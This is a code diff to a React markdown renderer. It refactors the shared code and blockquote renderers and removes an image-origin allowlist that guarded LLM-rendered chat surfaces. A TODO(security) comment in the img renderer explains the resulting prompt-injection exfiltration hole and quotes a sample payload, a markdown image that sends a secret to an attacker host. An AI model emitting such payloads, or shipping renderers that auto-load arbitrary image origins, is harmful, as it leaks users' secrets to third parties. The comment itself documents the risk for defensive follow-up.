@@ -13,46 +13,35 @@ import { cn } from '../../../utils/cn';
 import type { ResolveLinkResult } from '../../../types/doc-source';
 import type { TextSizeElement } from './text-size';
 import { MermaidDiagram } from './mermaid-diagram';
-import { isImageSrcAllowed, type MarkdownUrlPolicy } from './sanitize';
 import { extractText } from './heading-ids';
 
 export interface BuildBaseComponentsOptions {
   textSizes: Record<TextSizeElement, string>;
   generateHeadingId: (text: string, level: number) => string;
   demoteMarkdownH1ToH2: boolean;
-  brokenLinks: string[];
+  brokenLinks: readonly string[];
   currentPath?: string;
   onInternalLinkClick?: (path: string, options?: { expandFolder?: boolean; fromInternalLink?: boolean }) => void;
   onResolveLink?: (href: string, currentPath: string) => Promise<ResolveLinkResult>;
-  urlPolicy?: MarkdownUrlPolicy;
 }
 
-export function buildBaseComponents({
+/**
+ * The standard leaf renderers (`code` block + inline, `blockquote`) as
+ * standalone functions.
+ *
+ * SSOT for compositions that must OVERRIDE these renderers for a narrow
+ * special case and then fall through: the rich composition intercepts embed
+ * fence languages and Reddit's `reddit-embed-bq` blockquote, and delegates
+ * everything else here. Previously it reproduced both renderers
+ * byte-for-byte, so any class change here silently drifted on content
+ * surfaces.
+ */
+export function buildStandardLeafRenderers({
   textSizes,
-  generateHeadingId,
-  demoteMarkdownH1ToH2,
-  brokenLinks,
-  currentPath: propCurrentPath,
-  onInternalLinkClick,
-  onResolveLink,
-  urlPolicy,
-}: BuildBaseComponentsOptions): Components {
-  const makeHeading = (
-    Tag: 'h1' | 'h2' | 'h3' | 'h4' | 'h5' | 'h6',
-    level: number,
-    headingClassName: string,
-  ) =>
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    ({ children }: any) => {
-      const text = extractText(children);
-      const effectiveLevel = Tag === 'h1' && demoteMarkdownH1ToH2 ? 2 : level;
-      const id = generateHeadingId(text, effectiveLevel);
-      const EffectiveTag = Tag === 'h1' && demoteMarkdownH1ToH2 ? 'h2' : Tag;
-      return <EffectiveTag id={id} className={headingClassName}>{children}</EffectiveTag>;
-    };
-
+}: {
+  textSizes: Record<TextSizeElement, string>;
+}): Pick<Components, 'code' | 'blockquote'> {
   return {
-    // --- code ---
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
     code: ({ node, inline, className: codeClassName, children, ...props }: any) => {
       const match = /language-(\w+)/.exec(codeClassName || '');
@@ -75,7 +64,7 @@ export function buildBaseComponents({
                 <code
                   className={cn(`language-${language} hljs`, textSizes.code)}
                   style={{
-                    fontFamily: "JetBrains Mono', 'SF Mono', Consolas, monospace",
+                    fontFamily: "'JetBrains Mono', 'SF Mono', Consolas, monospace",
                     background: 'transparent',
                     color: 'var(--color-text-primary)',
                   }}
@@ -96,13 +85,6 @@ export function buildBaseComponents({
       );
     },
 
-    // --- div (pass-through, overridable for embeds) ---
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    div: ({ node, className: divClassName, children, ...props }: any) => (
-      <div className={divClassName} {...props}>{children}</div>
-    ),
-
-    // --- blockquote ---
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
     blockquote: ({ children }: any) => (
       <blockquote className="border-l-4 border-ods-accent ml-0 pl-6 my-8 py-4 rounded-r-lg bg-ods-bg-surface">
@@ -110,6 +92,41 @@ export function buildBaseComponents({
           {children}
         </div>
       </blockquote>
+    ),
+  };
+}
+
+export function buildBaseComponents({
+  textSizes,
+  generateHeadingId,
+  demoteMarkdownH1ToH2,
+  brokenLinks,
+  currentPath: propCurrentPath,
+  onInternalLinkClick,
+  onResolveLink,
+}: BuildBaseComponentsOptions): Components {
+  const makeHeading = (
+    Tag: 'h1' | 'h2' | 'h3' | 'h4' | 'h5' | 'h6',
+    level: number,
+    headingClassName: string,
+  ) =>
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    ({ children }: any) => {
+      const text = extractText(children);
+      const effectiveLevel = Tag === 'h1' && demoteMarkdownH1ToH2 ? 2 : level;
+      const id = generateHeadingId(text, effectiveLevel);
+      const EffectiveTag = Tag === 'h1' && demoteMarkdownH1ToH2 ? 'h2' : Tag;
+      return <EffectiveTag id={id} className={headingClassName}>{children}</EffectiveTag>;
+    };
+
+  return {
+    // --- code + blockquote (shared leaf renderers, see above) ---
+    ...buildStandardLeafRenderers({ textSizes }),
+
+    // --- div (pass-through, overridable for embeds) ---
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    div: ({ node, className: divClassName, children, ...props }: any) => (
+      <div className={divClassName} {...props}>{children}</div>
     ),
 
     // --- headings ---
@@ -203,21 +220,17 @@ export function buildBaseComponents({
     // CAP at 400x400 with natural-size rendering for small images —
     // click-to-expand surfaces provide full resolution. Next.js <Image>
     // via the embed shim gives WebP/AVIF + lazy-loading on Next hosts and
-    // a plain <img> elsewhere. The `urlPolicy` gate is the LLM-surface
-    // exfiltration defense — evaluated only on completed URL tokens.
+    // a plain <img> elsewhere.
+    //
+    // TODO(security): LLM-rendered surfaces still auto-load ANY image origin,
+    // so a prompt-injected `![](https://attacker/log?d=<secret>)` exfiltrates
+    // silently. An image-origin allowlist is a tracked follow-up: it requires
+    // a host-supplied origin list threaded from each chat composition (there
+    // is no safe default this library can pick), so it is deliberately absent
+    // rather than shipped unwired.
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
     img: ({ src, alt }: any) => {
       if (!src || typeof src !== 'string' || src.trim() === '') return null;
-      if (!isImageSrcAllowed(src, urlPolicy)) {
-        if (urlPolicy?.onBlockedUrl === 'placeholder') {
-          return (
-            <span className="inline-block rounded border border-ods-border bg-ods-card px-2 py-1 text-xs text-ods-text-tertiary">
-              image blocked: external origin
-            </span>
-          );
-        }
-        return null;
-      }
       return (
         <Image
           src={src}
